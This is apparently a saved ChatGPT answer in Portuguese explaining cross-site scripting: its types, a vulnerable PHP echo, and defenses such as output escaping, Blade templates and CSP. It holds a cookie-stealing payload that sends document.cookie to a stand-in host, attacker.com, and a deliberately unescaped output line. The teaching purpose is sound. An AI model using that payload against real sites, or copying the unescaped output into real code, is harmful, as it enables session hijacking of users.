# XSS

## by chatgpt

###

### q2

> Fale mais sobre XSS

Claro, Rafael! Vamos explorar o **XSS (Cross-Site Scripting)** de forma prática, direta e detalhada:

---

## 💡 O que é XSS?

**XSS** é uma vulnerabilidade que permite a um atacante **injetar scripts maliciosos em páginas vistas por outros usuários**.  
Esse código é executado **no navegador da vítima**, com os **mesmos privilégios da sessão legítima**.

---

## 🎯 Objetivo do atacante

- Roubar cookies de sessão.
- Redirecionar para sites maliciosos.
- Capturar dados digitados (ex: senhas).
- Instalar malware via navegador.
- Manipular a página visualmente.

---

## 🧨 Tipos de XSS

| Tipo              | Como funciona                                            | Exemplo                                                       |
|-------------------|----------------------------------------------------------|----------------------------------------------------------------|
| **Refletido**     | O script vem direto da URL e é refletido na resposta     | `https://site.com/search?q=<script>alert(1)</script>`         |
| **Armazenado**    | O script fica salvo no banco e é exibido a outras vítimas| Comentários, fóruns, perfis com `<script>`                    |
| **DOM-based**     | O script manipula o DOM via JS sem interação com o servidor | `document.location`, `innerHTML` usado sem cuidado             |

---

## ⚠️ Exemplo real de XSS Armazenado (em PHP puro)

### PHP com falha:

```php
// exibir_comentario.php
echo $_POST['comentario'];
```

### Usuário malicioso envia:

```html
<script>fetch('https://attacker.com/log?cookie=' + document.cookie)</script>
```

O navegador da vítima executa o script e envia seu cookie de sessão ao invasor.

---

## 🔒 Como se proteger de XSS

### 1. **Escape de saída (output)**

Sempre que mostrar dados do usuário:

#### PHP:

```php
echo htmlspecialchars($comentario, ENT_QUOTES, 'UTF-8');
```

#### Laravel (Blade):

```blade
{{ $comentario }}  {{-- já escapa por padrão --}}
{!! $comentario !!} {{-- PERIGOSO: usa apenas se confiar 100% no conteúdo --}}
```

---

### 2. **Content Security Policy (CSP)**

Bloqueia execução de scripts não autorizados.

```http
Content-Security-Policy: default-src 'self';
```

---

### 3. **Filtros de input (não são suficientes sozinhos)**

Ex: bloquear `<script>`, `onerror`, `javascript:`

---

### 4. **Use frameworks que escapam por padrão**

Laravel, Django, Rails... escapam automaticamente no template.

---

## ✅ Conclusão

O XSS é **um dos ataques mais comuns e perigosos**, porque ataca **o usuário**, não o servidor diretamente.  
Ele serve como **porta de entrada** para sequestro de sessão, phishing, keylogging e mais.

---

Se quiser, posso montar um pequeno ambiente PHP vulnerável para você testar XSS localmente com ataques simples — deseja esse exemplo?
